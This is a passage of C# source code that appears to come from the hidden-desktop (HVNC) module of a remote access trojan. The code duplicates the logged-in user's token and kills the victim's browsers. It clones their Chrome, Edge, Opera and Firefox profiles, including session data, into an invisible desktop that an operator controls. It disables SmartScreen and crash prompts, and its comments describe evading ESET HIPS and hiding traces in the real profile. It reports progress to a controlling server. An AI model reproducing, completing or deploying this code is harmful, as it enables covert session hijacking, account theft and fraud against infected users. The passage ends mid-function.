    // Kill any Rundll32 that has a window on the hidden desktop — catches mscories even when
    // launched by a different parent (App Compat shim, svchost, etc.).
    private static void KillRundll32OnHvncDesktop()
    {
        if (_hDesktop == 0) return;
        const uint TH32CS_SNAPPROCESS = 0x00000002;
        const uint PROCESS_TERMINATE  = 0x0001;

        // Build PID set of all Rundll32 processes
        nint snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == (nint)(-1) || snap == 0) return;
        var rundll32Pids = new System.Collections.Generic.HashSet<uint>();
        try
        {
            var pe = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf<PROCESSENTRY32W>() };
            if (Process32FirstW(snap, ref pe))
                do
                {
                    if (pe.szExeFile.Equals("rundll32.exe", StringComparison.OrdinalIgnoreCase))
                        rundll32Pids.Add(pe.th32ProcessID);
                    pe.dwSize = (uint)Marshal.SizeOf<PROCESSENTRY32W>();
                } while (Process32NextW(snap, ref pe));
        }
        finally { CloseHandle(snap); }

        if (rundll32Pids.Count == 0) return;

        // Enumerate every window on the hidden desktop; terminate owners that are Rundll32
        EnumDesktopWindows(_hDesktop, (hwnd, _) =>
        {
            GetWindowThreadProcessId(hwnd, out uint pid);
            if (rundll32Pids.Contains(pid))
            {
                nint hProc = OpenProcess(PROCESS_TERMINATE, false, pid);
                if (hProc != 0)
                {
                    TerminateProcess(hProc, 0);
                    CloseHandle(hProc);
                    StubLog.Info($"[HVNC] Killed desktop rundll32 pid={pid}");
                }
            }
            return true;
        }, 0);
    }

    private static void KillWindowProcess(nint hwnd)
    {
        GetWindowThreadProcessId(hwnd, out uint pid);
        if (pid == 0) { PostMessage(hwnd, WM_CLOSE, 0, 0); return; }

        // Remove from single-instance tracking
        foreach (var kv in _launchedPids)
            if (kv.Value == pid) { _launchedPids.TryRemove(kv.Key, out _); break; }

        const uint PROCESS_TERMINATE = 0x0001;
        nint hProc = OpenProcess(PROCESS_TERMINATE, false, pid);
        if (hProc != 0)
        {
            TerminateProcess(hProc, 0);
            CloseHandle(hProc);
            StubLog.Info($"[HVNC] KillOnClose pid={pid}");
        }
        else
        {
            PostMessage(hwnd, WM_CLOSE, 0, 0);
        }
    }

    // Send WM_CLOSE to all windows of each Chromium browser on the hidden desktop,
    // then wait up to 2.5 s for a clean exit before the caller force-kills them.
    // This lets the browser flush exit_type=Normal to disk so ESET HIPS doesn't see
    // abnormal termination and start blocking the profile directory.
    private static void GracefulKillBrowsers()
    {
        if (_hDesktop == 0) return;
        const uint SYNCHRONIZE          = 0x00100000;
        const uint WAIT_TIMEOUT_MS      = 2500;

        // Build set of PIDs that are Chromium browsers
        var browserPids = new HashSet<uint>();
        foreach (var kv in _launchedPids)
            if (_chromiumBrowsers.Contains(kv.Key))
                browserPids.Add(kv.Value);
        if (browserPids.Count == 0) return;

        // Send WM_CLOSE to every top-level window on the hidden desktop owned by a browser PID
        EnumDesktopWindows(_hDesktop, (hwnd, _) =>
        {
            GetWindowThreadProcessId(hwnd, out uint pid);
            if (browserPids.Contains(pid))
                PostMessage(hwnd, WM_CLOSE, 0, 0);
            return true;
        }, 0);

        // Wait for each browser process to exit cleanly
        var deadline = Environment.TickCount64 + WAIT_TIMEOUT_MS;
        foreach (var pid in browserPids)
        {
            int remaining = (int)(deadline - Environment.TickCount64);
            if (remaining <= 0) break;
            nint hProc = OpenProcess(SYNCHRONIZE, false, pid);
            if (hProc == 0) continue;
            WaitForSingleObject(hProc, (uint)Math.Max(0, remaining));
            CloseHandle(hProc);
        }
    }

    private static void CleanChromiumHvncLocks()
    {
        string hvncRoot = Path.Combine(Path.GetTempPath(), "SeroHvnc");
        if (!Directory.Exists(hvncRoot)) return;
        foreach (var dir in Directory.EnumerateDirectories(hvncRoot))
        {
            foreach (var name in new[] { "SingletonLock", "SingletonSocket", "SingletonCookie" })
                try { File.Delete(Path.Combine(dir, name)); } catch { }
            // Also repair any corrupted Preferences in the HVNC temp profile
            RepairChromiumJsonFile(Path.Combine(dir, "Default", "Preferences"));
            RepairChromiumJsonFile(Path.Combine(dir, "Local State"));
        }
    }

    private static void CleanRealBrowserLock(params string[] profilePathParts)
    {
        string appData  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        foreach (var root in new[] { appData, localApp })
        {
            string dir = root;
            foreach (var part in profilePathParts)
                dir = Path.Combine(dir, part);
            foreach (var name in new[] { "SingletonLock", "SingletonSocket", "SingletonCookie" })
                try { File.Delete(Path.Combine(dir, name)); } catch { }
        }
    }

    // Repairs the real Opera profile after HVNC use.
    // Previous code had a bug: ("Opera Software","Opera Stable","Opera GX Stable") joined all
    // three into ONE wrong path — nothing was ever cleaned. Now we handle each variant separately
    // AND also repair corrupted JSON files that cause "erreur de profil" popups.
    private static void RepairOperaProfileAfterHvnc()
    {
        string appData  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string tmp      = Path.GetTempPath();

        // ── 1. Nuke HVNC temp profiles entirely so Opera always starts fresh ──
        // These dirs are created by the --user-data-dir= flag in the HVNC launch cmd.
        // Force-killing Opera corrupts them; deleting them is the only reliable fix.
        foreach (var hvncDir in new[] { "hvnc_opera", "hvnc_operagx" })
        {
            string d = Path.Combine(tmp, hvncDir);
            if (Directory.Exists(d))
                try { Directory.Delete(d, true); } catch { }
        }

        // ── 2. Reset crash-recovery counter (ATTEMPTS registry key) ──────────
        // Chromium increments this on each start; never decrements when killed by HVNC.
        // At high values Opera shows 3 cascading "profile error" popups on next launch.
        try
        {
            using var hk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                @"Software\Opera Software", writable: true);
            hk?.SetValue("ATTEMPTS", 0, Microsoft.Win32.RegistryValueKind.DWord);
        }
        catch { }

        // ── 3. Repair the real Opera profile (lock files + JSON validation) ──
        foreach (var variant in new[] { "Opera Stable", "Opera GX Stable" })
        {
            foreach (var root in new[] { appData, localApp })
            {
                string profileDir = Path.Combine(root, "Opera Software", variant);
                if (!Directory.Exists(profileDir)) continue;

                foreach (var name in new[] { "SingletonLock", "SingletonSocket", "SingletonCookie" })
                    try { File.Delete(Path.Combine(profileDir, name)); } catch { }

                RepairChromiumJsonFile(Path.Combine(profileDir, "Local State"));

                foreach (var sub in new[] { "Default", "Profile 1", "Guest Profile" })
                {
                    string subDir = Path.Combine(profileDir, sub);
                    if (!Directory.Exists(subDir)) continue;
                    RepairChromiumJsonFile(Path.Combine(subDir, "Preferences"));
                    RepairChromiumJsonFile(Path.Combine(subDir, "Secure Preferences"));
                }
            }
        }
    }

    // Checks a Chromium JSON file for validity. Deletes it if empty or invalid so
    // the browser can recreate it fresh — avoids "erreur de profil" on next launch.
    private static void RepairChromiumJsonFile(string path)
    {
        if (!File.Exists(path)) return;
        try
        {
            var text = File.ReadAllText(path);
            if (string.IsNullOrWhiteSpace(text) || text.TrimStart().Length < 2)
            {
                File.Delete(path);
                return;
            }
            System.Text.Json.JsonDocument.Parse(text); // throws if invalid JSON
        }
        catch
        {
            try { File.Delete(path); } catch { }
        }
    }

    private static string? GetChromiumRealProfile(string exeBase)
    {
        string local  = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        return exeBase.ToLowerInvariant() switch
        {
            "chrome.exe"   => Path.Combine(local,   "Google",           "Chrome",         "User Data"),
            "msedge.exe"   => Path.Combine(local,   "Microsoft",        "Edge",           "User Data"),
            "brave.exe"    => Path.Combine(local,   "BraveSoftware",    "Brave-Browser",  "User Data"),
            "vivaldi.exe"  => Path.Combine(local,   "Vivaldi",          "User Data"),
            "chromium.exe" => Path.Combine(local,   "Chromium",         "User Data"),
            "opera.exe"    => Path.Combine(roaming, "Opera Software",   "Opera Stable"),
            _ => null
        };
    }

    // Directories that are safe to skip — cache, GPU shaders, crash dumps, metrics.
    // Skipping them cuts profile copy from ~10 s to ~1-2 s on typical installs.
    private static readonly HashSet<string> _skipProfileDirs = new(StringComparer.OrdinalIgnoreCase)
    {
        "Cache", "Code Cache", "GPUCache", "ShaderCache", "DawnCache",
        "GrShaderCache", "Snapshots", "CrashReports", "Crash Reports", "Crashpad",
        "BrowserMetrics", "BrowserMetrics-spare", "component_crx_cache",
        "optimization_guide_model_downloads", "Safe Browsing", "FileTypePolicies",
        "PepperFlash", "WidevineCdm", "MEIPreload", "OriginTrials",
        // Firefox
        "cache2", "startupCache", "shader-cache", "thumbnails", "storage"
    };

    private static readonly ParallelOptions _cloneParallel = new() { MaxDegreeOfParallelism = 4 };

    // Single-pass: collect all file pairs + create all destination dirs, then copy in parallel.
    // This avoids a separate count pass and eliminates nested Parallel.ForEach calls.
    private static void CollectFilePairs(string src, string dst,
        List<(string Src, string Dst)> pairs)
    {
        if (!Directory.Exists(src)) return;
        try { Directory.CreateDirectory(dst); } catch { }
        try
        {
            foreach (var file in Directory.EnumerateFiles(src))
                pairs.Add((file, Path.Combine(dst, Path.GetFileName(file))));
        }
        catch { }
        try
        {
            foreach (var dir in Directory.EnumerateDirectories(src))
            {
                if (_skipProfileDirs.Contains(Path.GetFileName(dir))) continue;
                CollectFilePairs(dir, Path.Combine(dst, Path.GetFileName(dir)), pairs);
            }
        }
        catch { }
    }

    private static void CloneProfileToDir(string src, string dst)
    {
        var pairs = new List<(string Src, string Dst)>();
        CollectFilePairs(src, dst, pairs);
        if (pairs.Count == 0) return;
        Parallel.ForEach(pairs, _cloneParallel, static pair =>
        {
            try { File.Copy(pair.Src, pair.Dst, overwrite: true); }
            catch (IOException) { }
            catch (UnauthorizedAccessException) { }
            catch { }
        });
    }

    private static void CloneProfileWithProgress(string src, string dst, string label)
    {
        var pairs = new List<(string Src, string Dst)>();
        CollectFilePairs(src, dst, pairs);
        int total = pairs.Count;
        if (total <= 0) { SendHvncProgress(100, label); return; }
        var progress = new int[1];
        using var cts = new System.Threading.CancellationTokenSource();
        var reporter = new Thread(() =>
        {
            while (!cts.IsCancellationRequested)
            {
                int pct = Math.Clamp(Volatile.Read(ref progress[0]) * 99 / total, 0, 99);
                SendHvncProgress(pct, label);
                Thread.Sleep(150);
            }
        }) { IsBackground = true, Name = "HvncProgressReporter" };
        reporter.Start();
        Parallel.ForEach(pairs, _cloneParallel, pair =>
        {
            try { File.Copy(pair.Src, pair.Dst, overwrite: true); }
            catch (IOException) { }
            catch (UnauthorizedAccessException) { }
            catch { }
            Interlocked.Increment(ref progress[0]);
        });
        cts.Cancel();
        reporter.Join(500);
        SendHvncProgress(100, label);
    }

    private static void SendHvncProgress(int pct, string label)
    {
        try
        {
            var json = JsonSerializer.Serialize(
                new HvncProgressDataStub { Pct = pct, Label = label },
                SeroJson.Default.HvncProgressDataStub);
            _send?.Invoke((int)PacketType.HvncProgress, json).Wait(200);
        }
        catch { }
    }

    private static string? GetFirefoxRealProfile()
    {
        string ffBase = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Mozilla", "Firefox");
        string iniPath = Path.Combine(ffBase, "profiles.ini");
        if (!File.Exists(iniPath)) return null;

        string? bestPath    = null;
        string? currentPath = null;
        bool    isRelative  = true;
        bool    isDefault   = false;

        void Commit()
        {
            if (currentPath == null) return;
            string full = isRelative
                ? Path.Combine(ffBase, currentPath.Replace('/', Path.DirectorySeparatorChar))
                : currentPath;
            if (bestPath == null || isDefault) bestPath = full;
        }

        foreach (var line in File.ReadLines(iniPath))
        {
            string t = line.Trim();
            if (t.StartsWith('['))
            {
                Commit(); currentPath = null; isRelative = true; isDefault = false;
            }
            else if (t.StartsWith("Path=",       StringComparison.OrdinalIgnoreCase)) currentPath = t[5..];
            else if (t.StartsWith("IsRelative=", StringComparison.OrdinalIgnoreCase)) isRelative  = t[11..].Trim() == "1";
            else if (t.Equals(    "Default=1",   StringComparison.OrdinalIgnoreCase)) isDefault   = true;
        }
        Commit();

        return bestPath != null && Directory.Exists(bestPath) ? bestPath : null;
    }

    private static void CleanFirefoxRealLocks()
    {
        string? p = GetFirefoxRealProfile();
        if (p == null) return;
        foreach (var lk in new[] { "parent.lock", "lock" })
            try { File.Delete(Path.Combine(p, lk)); } catch { }
    }

    // Kills all processes with the given exe name and waits up to timeoutMs for them to exit,
    // polling every 100 ms so file handles are actually released before the caller copies files.
    private static void KillAndWaitForExit(string exeName, int timeoutMs = 3000)
    {
        KillProcessByName(exeName);
        string nameNoExt = Path.GetFileNameWithoutExtension(exeName);
        long deadline = Environment.TickCount64 + timeoutMs;
        while (Environment.TickCount64 < deadline)
        {
            if (System.Diagnostics.Process.GetProcessesByName(nameNoExt).Length == 0) break;
            Thread.Sleep(100);
        }
    }

    private static void KillProcessByName(string exeName)
    {
        const uint TH32CS_SNAPPROCESS = 0x00000002;
        const uint PROCESS_TERMINATE  = 0x0001;
        nint snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == (nint)(-1) || snap == 0) return;
        try
        {
            var pe = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf<PROCESSENTRY32W>() };
            if (!Process32FirstW(snap, ref pe)) return;
            do
            {
                if (string.Equals(pe.szExeFile, exeName, StringComparison.OrdinalIgnoreCase))
                {
                    nint h = OpenProcess(PROCESS_TERMINATE, false, pe.th32ProcessID);
                    if (h != 0) { TerminateProcess(h, 0); CloseHandle(h); }
                }
            } while (Process32NextW(snap, ref pe));
        }
        finally { CloseHandle(snap); }
    }

    // Kills a process and all its descendants (renderer, GPU, network-service child procs, etc.).
    // TerminateProcess on the parent alone leaves orphaned children that keep holding profile locks.
    private static void KillProcessTree(uint rootPid)
    {
        const uint TH32CS_SNAPPROCESS = 0x00000002;
        const uint PROCESS_TERMINATE  = 0x0001;
        nint snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == (nint)(-1) || snap == 0) return;
        try
        {
            // Build parent → [children] map
            var childMap = new Dictionary<uint, List<uint>>();
            var pe = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf<PROCESSENTRY32W>() };
            if (!Process32FirstW(snap, ref pe)) return;
            do
            {
                if (!childMap.TryGetValue(pe.th32ParentProcessID, out var lst))
                    childMap[pe.th32ParentProcessID] = lst = new List<uint>();
                lst.Add(pe.th32ProcessID);
            } while (Process32NextW(snap, ref pe));

            // BFS to collect every descendant
            var toKill = new List<uint>();
            var queue  = new Queue<uint>();
            queue.Enqueue(rootPid);
            while (queue.Count > 0)
            {
                uint pid = queue.Dequeue();
                toKill.Add(pid);
                if (childMap.TryGetValue(pid, out var kids))
                    foreach (var kid in kids) queue.Enqueue(kid);
            }

            // Kill leaves first so children can't re-spawn, then the root
            for (int i = toKill.Count - 1; i >= 0; i--)
            {
                nint h = OpenProcess(PROCESS_TERMINATE, false, toKill[i]);
                if (h != 0) { TerminateProcess(h, 0); CloseHandle(h); }
            }
        }
        finally { CloseHandle(snap); }
    }

    private static bool IsProcessAlive(uint pid)
    {
        if (pid == 0) return false;
        const uint SYNCHRONIZE = 0x00100000;
        nint h = OpenProcess(SYNCHRONIZE, false, pid);
        if (h == 0) return false;
        CloseHandle(h);
        return true;
    }

    private static bool IsWindowMaximized(nint hwnd)
    {
        var wp = new WINDOWPLACEMENT { length = (uint)Marshal.SizeOf<WINDOWPLACEMENT>() };
        GetWindowPlacement(hwnd, ref wp);
        return wp.showCmd == 3; // SW_SHOWMAXIMIZED
    }

    private static nint MakeLParam(int x, int y) =>
        (nint)(((y & 0xFFFF) << 16) | (x & 0xFFFF));

    private static bool IsNonPrintableVK(int vk) =>
        (vk >= 0x70 && vk <= 0x7B) ||                                          // F1-F12
        vk is >= 0x21 and <= 0x28  ||                                          // PgUp/Down/End/Home/Arrows
        vk is 0x2D or 0x2E         ||                                          // Insert/Delete
        vk is 0x0D or 0x1B or 0x09 or 0x08 ||                                 // Enter/Esc/Tab/Back
        vk is 0x10 or 0xA0 or 0xA1 or 0x11 or 0xA2 or 0xA3 or 0x12 or 0xA4 or 0xA5 || // Shift/Ctrl/Alt
        vk is 0x5B or 0x5C or 0x5D;                                            // Win keys

    // ── Process launcher ──────────────────────────────────────────────────────

    // Returns a primary token for the interactive user (needed when stub runs as SYSTEM or elevated admin).
    // Caller is responsible for CloseHandle. Returns 0 if not applicable / unavailable.
    private static nint GetLaunchToken()
    {
        const uint TOKEN_ALL_ACCESS      = 0xF01FF;
        const uint PROCESS_QUERY_LIMITED = 0x1000;

        uint session = WTSGetActiveConsoleSessionId();
        if (session != 0xFFFFFFFF && WTSQueryUserToken(session, out nint wtsToken))
        {
            if (DuplicateTokenEx(wtsToken, TOKEN_ALL_ACCESS, 0, 2, 1, out nint dup))
            { CloseHandle(wtsToken); return dup; }
            CloseHandle(wtsToken);
        }

        nint snap = CreateToolhelp32Snapshot(2, 0);
        if (snap == (nint)(-1)) return 0;
        try
        {
            var e = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf<PROCESSENTRY32W>() };
            if (!Process32FirstW(snap, ref e)) return 0;
            do
            {
                if (!e.szExeFile.Equals("explorer.exe", StringComparison.OrdinalIgnoreCase)) continue;
                nint hProc = OpenProcess(PROCESS_QUERY_LIMITED, false, e.th32ProcessID);
                if (hProc == 0) continue;
                if (OpenProcessToken(hProc, TOKEN_ALL_ACCESS, out nint hTok))
                {
                    CloseHandle(hProc);
                    if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, 0, 2, 1, out nint dup))
                    { CloseHandle(hTok); return dup; }
                    CloseHandle(hTok);
                    return 0;
                }
                CloseHandle(hProc);
            }
            while (Process32NextW(snap, ref e));
        }
        finally { CloseHandle(snap); }
        return 0;
    }

    private static void LaunchOnDesktop(string path, bool isRetry = false, bool cloneBrowser = false)
    {
        if (_hDesktop == 0) return;
        try
        {
            // Expand environment variables first
            if (path.Contains('%'))
            {
                var buf = new System.Text.StringBuilder(1024);
                ExpandEnvironmentStrings(path, buf, 1024);
                path = buf.ToString();
            }

            // Resolve wildcard glob like app-*\Discord.exe
            if (path.Contains('*'))
            {
                string? resolved = ResolveGlob(path);
                if (resolved != null) path = resolved;
            }

            // If exe doesn't exist, try swapping ProgramFiles / ProgramFiles(x86)
            if (!ExeExists(path))
            {
                string? alt = AltProgramFiles(path);
                if (alt != null && ExeExists(alt))
                {
                    StubLog.Info($"[HVNC] Path fallback: '{path}' → '{alt}'");
                    path = alt;
                }
            }

            // Last resort: search common user directories for portable installs.
            if (!ExeExists(path))
            {
                int    eiIdx   = path.IndexOf(".exe", StringComparison.OrdinalIgnoreCase);
                string exeStem = System.IO.Path.GetFileNameWithoutExtension(eiIdx >= 0 ? path[..(eiIdx + 4)] : path);
                string exeFile = exeStem + ".exe";
                string userProfile = Environment.GetEnvironmentVariable("USERPROFILE") ?? "";
                string localApp    = Environment.GetEnvironmentVariable("LOCALAPPDATA") ?? "";
                string[] tryGlobs = [
                    System.IO.Path.Combine(userProfile, "Downloads", exeStem + "*", exeFile),
                    System.IO.Path.Combine(userProfile, "Desktop",   exeStem + "*", exeFile),
                    System.IO.Path.Combine(localApp,                 exeStem + "*", exeFile),
                ];
                foreach (var g in tryGlobs)
                {
                    string? r = ResolveGlob(g);
                    if (r != null) { StubLog.Info($"[HVNC] Portable fallback: '{r}'"); path = r; break; }
                }
            }

            // Extract exe basename for PID tracking (after all path resolution)
            int exeEndIdx = path.IndexOf(".exe", StringComparison.OrdinalIgnoreCase);
            string exeBase = exeEndIdx >= 0
                ? System.IO.Path.GetFileName(path[..(exeEndIdx + 4)]).ToLowerInvariant()
                : System.IO.Path.GetFileName(path).ToLowerInvariant();

            // Discord: kill only if we previously launched it from HVNC (single-instance mutex).
            if (path.IndexOf("discord", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                bool ownDiscord = _launchedPids.ContainsKey("discord.exe") || _launchedPids.ContainsKey("update.exe");
                if (ownDiscord) KillProcessByName("discord.exe");
                _launchedPids.TryRemove("discord.exe", out _);
                _launchedPids.TryRemove("update.exe", out _);
            }
            // Kill-before-launch for single-instance apps — only if previously launched by HVNC.
            else if (_killBeforeLaunch.Contains(exeBase))
            {
                if (_launchedPids.ContainsKey(exeBase)) KillProcessByName(exeBase);
                _launchedPids.TryRemove(exeBase, out _);
            }
            // Qt apps with -many support: allow running alongside real desktop, preserve user settings.
            else if (_qtManyApps.Contains(exeBase))
            {
                if (_launchedPids.TryGetValue(exeBase, out uint qtPid) && IsProcessAlive(qtPid))
                {
                    StubLog.Info($"[HVNC] '{exeBase}' already running in HVNC (pid={qtPid}), skipping");
                    return;
                }
            }
            else if (!_multiInstance.Contains(exeBase) &&
                     !_chromiumBrowsers.Contains(exeBase) && exeBase != "firefox.exe" &&
                     _launchedPids.TryGetValue(exeBase, out uint existingPid) && IsProcessAlive(existingPid))
            {
                StubLog.Info($"[HVNC] '{exeBase}' already running (pid={existingPid}), skipping");
                return;
            }

            var deskPtr = Marshal.StringToHGlobalUni("WinSta0\\" + DesktopName);
            try
            {
            const uint STARTF_USEPOSITION   = 0x00000004;
            const uint STARTF_USESHOWWINDOW = 0x00000001;
            const uint CREATE_NEW_CONSOLE   = 0x00000010;
            // GUI apps must NOT get CREATE_NEW_CONSOLE — it spawns a phantom console window that
            // triggers the Windows App-Compat engine (Rundll32 mscories.dll,Install popup).
            bool isConsoleApp = exeBase is "cmd.exe" or "powershell.exe" or "pwsh.exe"
                                         or "wscript.exe" or "cscript.exe";
            var si = new STARTUPINFOW
            {
                cb          = 104,
                lpDesktop   = deskPtr,
                dwX         = 0,
                dwY         = 0,
                dwFlags     = STARTF_USEPOSITION | STARTF_USESHOWWINDOW,
                wShowWindow = (ushort)3 // SW_SHOWMAXIMIZED — ensure app fills the hidden desktop
            };

            string cmd;
            int exeEnd = path.IndexOf(".exe", StringComparison.OrdinalIgnoreCase);
            if (exeEnd >= 0 && exeEnd + 4 < path.Length && path[exeEnd + 4] == ' ')
            {
                string exePart  = path[..(exeEnd + 4)];
                string argsPart = path[(exeEnd + 5)..];
                cmd = $"\"{exePart}\" {argsPart}";
            }
            else
            {
                cmd = path.Contains(' ') ? $"\"{path}\"" : path;
            }

            // Separate PID key so Opera GX ("operagx.exe") doesn't collide with Opera ("opera.exe")
            string pidKey = exeBase;

            if (_chromiumBrowsers.Contains(exeBase))
            {
                bool isOperaGX = exeBase == "opera.exe" &&
                                 path.IndexOf("Opera GX", StringComparison.OrdinalIgnoreCase) >= 0;
                if (isOperaGX) pidKey = "operagx.exe";

                string hvncDirName = isOperaGX ? "operagx" : Path.GetFileNameWithoutExtension(exeBase);
                string hvncProfile = Path.Combine(Path.GetTempPath(), "SeroHvnc", hvncDirName);

                string? realProfile = isOperaGX
                    ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                   "Opera Software", "Opera GX Stable")
                    : GetChromiumRealProfile(exeBase);
                if (cloneBrowser && realProfile != null && Directory.Exists(realProfile))
                {
                    KillAndWaitForExit(exeBase, 3000);
                    try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, recursive: true); } catch { }
                    CloneProfileWithProgress(realProfile, hvncProfile, $"Cloning {hvncDirName}...");
                    StubLog.Info($"[HVNC] Profile cloned '{realProfile}' → '{hvncProfile}'");
                }
                else
                {
                    // Kill previous HVNC instance by PID only (avoids killing real browser).
                    if (_launchedPids.TryGetValue(pidKey, out uint oldPid) && IsProcessAlive(oldPid))
                    {
                        KillProcessTree(oldPid);
                        _launchedPids.TryRemove(pidKey, out _);
                        Thread.Sleep(500);
                    }
                    if (!cloneBrowser)
                    {
                        // Clean profile for isolated session (no cloning)
                        try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, recursive: true); } catch { }
                        Thread.Sleep(200);
                    }
                    try { Directory.CreateDirectory(hvncProfile); } catch { }
                    if (!cloneBrowser) SendHvncProgress(100, "");
                }
                foreach (var lk in new[] { "SingletonLock", "SingletonSocket", "SingletonCookie" })
                {
                    try { File.Delete(Path.Combine(hvncProfile, lk)); } catch { }
                    try { File.Delete(Path.Combine(hvncProfile, "Default", lk)); } catch { }
                }
                // Strip any --user-data-dir already in cmd from the server command.
                // Chromium picks the FIRST occurrence — we must remove the old one so ours wins.
                {
                    int ui = cmd.IndexOf("--user-data-dir=", StringComparison.OrdinalIgnoreCase);
                    if (ui >= 0)
                    {
                        int ei = ui + 16;
                        if (ei < cmd.Length && cmd[ei] == '"') { ei++; while (ei < cmd.Length && cmd[ei] != '"') ei++; if (ei < cmd.Length) ei++; }
                        else { while (ei < cmd.Length && cmd[ei] != ' ') ei++; }
                        cmd = (cmd[..ui] + (ei < cmd.Length ? cmd[ei..] : "")).Trim();
                    }
                }
                cmd += $" --user-data-dir=\"{hvncProfile}\"" +
                       " --start-maximized" +
                       " --no-first-run --no-default-browser-check --disable-default-apps" +
                       " --disable-background-mode --disable-background-networking" +
                       " --noerrdialogs --disable-session-crashed-bubble" +
                       " --disable-restore-session-state --disable-crash-reporter" +
                       " --no-recovery-component";
                if (exeBase == "msedge.exe")
                    cmd += " --disable-features=msEdgeRecovery,msSmartScreenProtection" +
                           " --disable-sync --hide-crash-restore-bubble";
                if (exeBase == "opera.exe")
                    cmd += " --disable-features=OperaCrashRestoreSession";
            }
            else if (_qtManyApps.Contains(exeBase))
            {
                // -many allows a second instance alongside the real-desktop instance.
                // Both share %APPDATA%\Telegram Desktop\ → HVNC instance inherits user theme (dark mode).
                cmd += " -many";
            }
            else if (exeBase == "firefox.exe")
            {
                string hvncProfile = Path.Combine(Path.GetTempPath(), "SeroHvnc", "firefox");
                string? realProfile = GetFirefoxRealProfile();
                if (cloneBrowser && realProfile != null && Directory.Exists(realProfile))
                {
                    KillAndWaitForExit("firefox.exe", 3000);
                    try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, true); } catch { }
                    CloneProfileWithProgress(realProfile, hvncProfile, "Cloning firefox...");
                    StubLog.Info($"[HVNC] Firefox profile cloned '{realProfile}' → '{hvncProfile}'");
                }
                else
                {
                    if (_launchedPids.TryGetValue("firefox.exe", out uint oldFfPid) && IsProcessAlive(oldFfPid))
                    {
                        KillProcessTree(oldFfPid);
                        _launchedPids.TryRemove("firefox.exe", out _);
                        Thread.Sleep(500);
                    }
                    if (!cloneBrowser)
                    {
                        // Clean profile for isolated session (no cloning)
                        try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, recursive: true); } catch { }
                        Thread.Sleep(200);
                    }
                    try { Directory.CreateDirectory(hvncProfile); } catch { }
                    if (!cloneBrowser) SendHvncProgress(100, "");
                }
                foreach (var lk in new[] { "parent.lock", "lock" })
                    try { File.Delete(Path.Combine(hvncProfile, lk)); } catch { }
                // Drop all server-supplied args — keep only the quoted exe, then add ours.
                // cmd = '"C:\Program Files\...\firefox.exe" -profile ...' so we must find
                // the CLOSING quote, not the first space (which would be inside "Program Files").
                if (cmd.Length > 0 && cmd[0] == '"')
                {
                    int closeQ = cmd.IndexOf('"', 1);
                    if (closeQ >= 0) cmd = cmd[..(closeQ + 1)];
                }
                else
                {
                    int sp = cmd.IndexOf(' ');
                    if (sp >= 0) cmd = cmd[..sp];
                }
                cmd += $" -profile \"{hvncProfile}\" -no-remote";
            }
            // Repair real Opera / Opera GX profile JSON before launch.
            if (exeBase == "opera.exe") RepairOperaProfileAfterHvnc();

            var sb = new System.Text.StringBuilder(cmd);
            uint createFlags = CREATE_UNICODE_ENVIRONMENT | (isConsoleApp ? CREATE_NEW_CONSOLE : 0u);
            nint launchToken = GetLaunchToken();
            nint envBlock = 0;
            if (launchToken != 0) CreateEnvironmentBlock(out envBlock, launchToken, false);
            PROCESS_INFORMATION pi;
            if (launchToken != 0)
            {
                if (!CreateProcessWithTokenW(launchToken, 0, 0, sb, createFlags, envBlock, 0, ref si, out pi) || pi.dwProcessId == 0)
                    if (!CreateProcessAsUserW(launchToken, 0, sb, 0, 0, false, createFlags, envBlock, 0, ref si, out pi) || pi.dwProcessId == 0)
                        CreateProcessW(0, sb, 0, 0, false, createFlags, 0, 0, ref si, out pi);
            }
            else
            {
                CreateProcessW(0, sb, 0, 0, false, createFlags, 0, 0, ref si, out pi);
            }
            if (envBlock    != 0) DestroyEnvironmentBlock(envBlock);
            if (launchToken != 0) CloseHandle(launchToken);
            StubLog.Info($"[HVNC] LaunchOnDesktop '{path}' pid={pi.dwProcessId}");
            if (pi.dwProcessId != 0) _launchedPids[pidKey] = pi.dwProcessId;
            if (pi.dwProcessId != 0 && exeBase == "opera.exe")    PatchCursorInfoAsync(pi.dwProcessId);
            if (pi.dwProcessId != 0 && exeBase == "explorer.exe") SuppressMscoriesAsync(pi.dwProcessId);
            // If Edge or Explorer exits within 3 s (failed startup), retry once automatically.
            // isRetry guard prevents chaining: the retry itself never schedules another retry.
            if (!isRetry && pi.dwProcessId != 0 && exeBase is "msedge.exe" or "explorer.exe")
            {
                var retryPid = pi.dwProcessId; var retryBase = exeBase; var retryPath = path; var retryClone = cloneBrowser;
                Task.Run(async () =>
                {
                    await Task.Delay(3000);
                    if (_hDesktop == 0 || IsProcessAlive(retryPid)) return;
                    StubLog.Info($"[HVNC] '{retryBase}' exited in <3 s — retrying once");
                    _launchedPids.TryRemove(retryBase, out _);
                    LaunchOnDesktop(retryPath, isRetry: true, cloneBrowser: retryClone);
                });
            }
            if (pi.hProcess != 0) CloseHandle(pi.hProcess);
            if (pi.hThread  != 0) CloseHandle(pi.hThread);
            }
            finally { Marshal.FreeHGlobal(deskPtr); }
        }
        catch (Exception ex) { StubLog.Error($"[HVNC] LaunchOnDesktop exception: {ex.Message}"); }
    }

    // Returns true if the .exe part of path exists on disk.
    private static bool ExeExists(string path)
    {
